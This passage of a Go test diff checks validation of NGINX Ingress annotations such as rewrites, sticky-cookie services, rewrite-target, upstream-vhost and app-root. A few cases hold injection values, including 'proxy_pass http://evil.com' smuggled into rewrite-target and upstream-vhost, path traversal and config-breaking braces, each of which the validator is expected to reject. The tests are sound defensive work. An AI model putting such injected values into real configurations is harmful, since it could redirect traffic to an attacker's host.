+			msg:            "valid nginx.org/grpc-services annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/grpc-services": "service-1,service-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+				"service-2": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/grpc-services annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/grpc-services": "service-1,service-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/grpc-services: Invalid value: "service-1,service-2": must be a comma-separated list of services. The following services were not found: service-2`,
+			},
+			msg: "invalid nginx.org/grpc-services annotation, service does not exist",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewrite-1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/rewrites annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewrite-1/",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/rewrites annotation, single-value, trailing '/'",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewrite-1/rewrite",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/rewrites annotation, single-value, uri levels",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=rewrite-1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName=service-1 rewrite=rewrite-1": path must start with '/' and must not include any whitespace character, '{', '}' or '$': 'rewrite-1'`,
+			},
+			msg: "invalid nginx.org/rewrites annotation, single-value, no '/' in the beginning",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "service-1 rewrite=/rewrite-1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "service-1 rewrite=/rewrite-1": 'service-1' is not a valid serviceName format, e.g. 'serviceName=tea-svc'`,
+			},
+			msg: "invalid nginx.org/rewrites annotation, single-value, invalid service name format, 'serviceName' missing",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName1=service-1 rewrite=/rewrite-1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName1=service-1 rewrite=/rewrite-1": 'serviceName1=service-1' is not a valid serviceName format, e.g. 'serviceName=tea-svc'`,
+			},
+			msg: "invalid nginx.org/rewrites annotation, single-value, invalid service name format, 'serviceName' typo",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrit=/rewrite-1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName=service-1 rewrit=/rewrite-1": 'rewrit=/rewrite-1' is not a valid rewrite path format, e.g. 'rewrite=/tea'`,
+			},
+			msg: "invalid nginx.org/rewrites annotation, single-value, invalid service name format, 'rewrite' typo ",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewrite",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName=service-1 rewrite=/rewrite": The following services were not found: service-1`,
+			},
+			msg: "invaild nginx.org/rewrites annotation, single-value, service does not exist",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewrite-{1}",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName=service-1 rewrite=/rewrite-{1}": path must start with '/' and must not include any whitespace character, '{', '}' or '$': '/rewrite-{1}'`,
+			},
+			msg: "invalid nginx.org/rewrites annotation, single-value, path containing special characters",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewr ite",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName=service-1 rewrite=/rewr ite": path must start with '/' and must not include any whitespace character, '{', '}' or '$': '/rewr ite'`,
+			},
+			msg: "invalid nginx.org/rewrites annotation, single-value, path containing white spaces",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewrite/$1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName=service-1 rewrite=/rewrite/$1": path must start with '/' and must not include any whitespace character, '{', '}' or '$': '/rewrite/$1'`,
+			},
+			msg: "invaild nginx.org/rewrites annotation, single-value, path containing regex characters",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewrite-1;serviceName=service-2 rewrite=/rewrite-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+				"service-2": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/rewrites annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=/rewrite-1;serviceName=service-2 rewrite=/rewrite-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName=service-1 rewrite=/rewrite-1;serviceName=service-2 rewrite=/rewrite-2": The following services were not found: service-2`,
+			},
+			msg: "valid nginx.org/rewrites annotation, multi-value, service does not exist",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "serviceName=service-1 rewrite=rewrite-1;serviceName=service-2 rewrite=/rewrite-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+				"service-2": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "serviceName=service-1 rewrite=rewrite-1;serviceName=service-2 rewrite=/rewrite-2": path must start with '/' and must not include any whitespace character, '{', '}' or '$': 'rewrite-1'`,
+			},
+			msg: "invalid nginx.org/rewrites annotation, multi-value without '/' in the beginning",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrites": "not_a_rewrite",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrites: Invalid value: "not_a_rewrite": 'not_a_rewrite' is not a valid rewrite format, e.g. 'serviceName=tea-svc rewrite=/'`,
+			},
+			msg: "invalid nginx.org/rewrites annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/sticky-cookie-services": "serviceName=service-1 srv_id expires=1h path=/service-1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/sticky-cookie-services annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/sticky-cookie-services": "serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/sticky-cookie-services annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1\;serviceName=service-2 srv_id expires=2h path=/service-2`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1\\;serviceName=service-2 srv_id expires=2h path=/service-2": invalid sticky-cookie parameters: srv_id expires=1h path=/service-1\`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=1h path=/service-1\`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2\`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2\\": invalid sticky-cookie parameters: srv_id expires=2h path=/service-2\`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=2h path=/service-2\`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1\`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1\\": invalid sticky-cookie parameters: srv_id expires=1h path=/service-1\`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=1h path=/service-1\`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1$`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1$": invalid sticky-cookie parameters: srv_id expires=1h path=/service-1$`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=1h path=/service-1$`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2$`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2$": invalid sticky-cookie parameters: srv_id expires=2h path=/service-2$`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=2h path=/service-2$`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/sticky-cookie-services": "not_a_rewrite",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/sticky-cookie-services: Invalid value: "not_a_rewrite": invalid sticky-cookie service format: not_a_rewrite. Must be a semicolon-separated list of sticky services`,
+			},
+			msg: "invalid nginx.org/sticky-cookie-services annotation",
+		},
+		// Test cases for nginx.com/sticky-cookie-services annotation
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/sticky-cookie-services: Forbidden: annotation requires NGINX Plus`,
+			},
+			msg: "invalid nginx.com/sticky-cookie-services annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": "serviceName=service-1 srv_id expires=1h path=/service-1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.com/sticky-cookie-services annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": "serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.com/sticky-cookie-services annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1\;serviceName=service-2 srv_id expires=2h path=/service-2`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1\\;serviceName=service-2 srv_id expires=2h path=/service-2": invalid sticky-cookie parameters: srv_id expires=1h path=/service-1\`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=1h path=/service-1\`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2\`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2\\": invalid sticky-cookie parameters: srv_id expires=2h path=/service-2\`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=2h path=/service-2\`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1\`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1\\": invalid sticky-cookie parameters: srv_id expires=1h path=/service-1\`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=1h path=/service-1\`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1$`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1$": invalid sticky-cookie parameters: srv_id expires=1h path=/service-1$`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=1h path=/service-1$`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": `serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2$`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/sticky-cookie-services: Invalid value: "serviceName=service-1 srv_id expires=1h path=/service-1;serviceName=service-2 srv_id expires=2h path=/service-2$": invalid sticky-cookie parameters: srv_id expires=2h path=/service-2$`,
+			},
+			msg: `invalid sticky-cookie parameters: srv_id expires=2h path=/service-2$`,
+		},
+		{
+			annotations: map[string]string{
+				"nginx.com/sticky-cookie-services": "not_a_rewrite",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.com/sticky-cookie-services: Invalid value: "not_a_rewrite": invalid sticky-cookie service format: not_a_rewrite. Must be a semicolon-separated list of sticky services`,
+			},
+			msg: "invalid nginx.com/sticky-cookie-services annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/use-cluster-ip": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/use-cluster-ip: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.org/use-cluster-ip annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/use-cluster-ip": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/use-cluster-ip annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/use-cluster-ip": "false",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/use-cluster-ip annotation",
+		},
+
+		// nginx.org/rewrite-target annotation tests
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/api/v1/$1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/rewrite-target annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/newpath",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/rewrite-target annotation, simple path",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/api/$1/$2/data",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/rewrite-target annotation, multiple capture groups",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrite-target: Required value`,
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, empty value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "http://example.com/path",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrite-target: Invalid value: "http://example.com/path": absolute URLs not allowed in rewrite target`,
+				"annotations.nginx.org/rewrite-target: Invalid value: \"http://example.com/path\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, absolute HTTP URL",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "https://example.com/path",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrite-target: Invalid value: "https://example.com/path": absolute URLs not allowed in rewrite target`,
+				"annotations.nginx.org/rewrite-target: Invalid value: \"https://example.com/path\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, absolute HTTPS URL",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "//example.com/path",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrite-target: Invalid value: "//example.com/path": protocol-relative URIs not allowed, must not start with '//'`,
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, protocol-relative URL",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/api/../admin/users",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrite-target: Invalid value: "/api/../admin/users": path traversal not allowed, path must not contain '..' segments`,
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, path traversal with ../",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/api/..\\admin/users",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrite-target: Invalid value: "/api/..\\admin/users": path traversal not allowed, path must not contain '..' segments`,
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, path traversal with ..\\ (Windows style)",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/foo/$1; } path / { my/location/test/ }",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/rewrite-target: Invalid value: \"/foo/$1; } path / { my/location/test/ }\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+				`annotations.nginx.org/rewrite-target: Invalid value: "/foo/$1; } path / { my/location/test/ }": NGINX configuration syntax characters (;{}) and []|<>,^` + "`" + `~ not allowed in rewrite target`,
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, NGINX configuration syntax characters (;{}) not allowed in rewrite target",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/api\npath",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/rewrite-target: Invalid value: \"/api\\npath\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+				`annotations.nginx.org/rewrite-target: Invalid value: "/api\npath": control characters not allowed in rewrite target`,
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, control characters not allowed in rewrite target",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "api/users",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/rewrite-target: Invalid value: \"api/users\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, does not start with slash",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/api/v1`; proxy_pass http://evil.com; #",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/rewrite-target: Invalid value: \"/api/v1`; proxy_pass http://evil.com; #\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+				"annotations.nginx.org/rewrite-target: Invalid value: \"/api/v1`; proxy_pass http://evil.com; #\": NGINX configuration syntax characters (;{}) and []|<>,^`~ not allowed in rewrite target",
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, backtick and semicolon injection",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/path/$1|/backup/$1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/rewrite-target: Invalid value: \"/path/$1|/backup/$1\": NGINX configuration syntax characters (;{}) and []|<>,^`~ not allowed in rewrite target",
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, pipe character for alternatives",
+		},
+
+		// nginx.org/upstream-vhost annotation tests
+		{
+			annotations: map[string]string{
+				"nginx.org/upstream-vhost": "example.internal",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/upstream-vhost annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/upstream-vhost": "my-app.example.com",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/upstream-vhost annotation with subdomain",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/upstream-vhost": "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/upstream-vhost: Required value`,
+			},
+			msg: "invalid nginx.org/upstream-vhost annotation, empty value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/upstream-vhost": "$host",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/upstream-vhost: Invalid value: "$host": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')`,
+			},
+			msg: "invalid nginx.org/upstream-vhost annotation, NGINX variable not allowed",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/upstream-vhost": "example.com; proxy_pass http://evil.com;",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/upstream-vhost: Invalid value: "example.com; proxy_pass http://evil.com;": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')`,
+			},
+			msg: "invalid nginx.org/upstream-vhost annotation, injection characters not allowed",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/coffee",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/app-root annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/coffee/mocha",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/app-root annotation with nested path",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "coffee",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/app-root: Invalid value: \"coffee\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+				`annotations.nginx.org/app-root: Invalid value: "coffee": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid nginx.org/app-root annotation, does not start with slash",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/": cannot be '/'`,
+				`annotations.nginx.org/app-root: Invalid value: "/": path should not end with '/'`,
+			},
+			msg: "invalid nginx.org/app-root annotation, cannot be root path",
+		},
+		{
+			annotations: map[string]string{
